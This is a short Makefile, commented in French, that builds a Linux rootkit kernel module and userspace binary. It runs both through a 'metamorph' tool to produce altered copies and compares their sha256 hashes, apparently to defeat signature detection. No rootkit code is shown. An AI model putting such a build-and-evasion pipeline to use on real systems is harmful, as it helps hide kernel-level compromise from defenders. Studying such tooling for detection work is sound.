METAMORPH  = metamorph/metamorph
MODULE_DIR = rootkit_module

# ── Build complet ────────────────────────────────────────────────────────────
all: $(METAMORPH) module morph

# ── Builder métamorphe ───────────────────────────────────────────────────────
$(METAMORPH):
	$(MAKE) -C metamorph

# ── Module kernel + binaire core ─────────────────────────────────────────────
module:
	$(MAKE) -C $(MODULE_DIR)

# ── Application des transforms ───────────────────────────────────────────────
morph: $(METAMORPH) module
	@echo ""
	@echo "=== metamorph : binaire userspace ==="
	./$(METAMORPH) $(MODULE_DIR)/rootkit $(MODULE_DIR)/rootkit_morph

	@echo ""
	@echo "=== metamorph : module kernel ==="
	./$(METAMORPH) $(MODULE_DIR)/rootkit.ko $(MODULE_DIR)/rootkit_morph.ko --ko

	@echo ""
	@echo "=== hashes ==="
	sha256sum $(MODULE_DIR)/rootkit       $(MODULE_DIR)/rootkit_morph
	sha256sum $(MODULE_DIR)/rootkit.ko    $(MODULE_DIR)/rootkit_morph.ko

# ── Nettoyage ─────────────────────────────────────────────────────────────────
clean:
	$(MAKE) -C metamorph clean
	$(MAKE) -C $(MODULE_DIR) clean
	rm -f $(MODULE_DIR)/rootkit_morph $(MODULE_DIR)/rootkit_morph.ko

.PHONY: all module morph clean
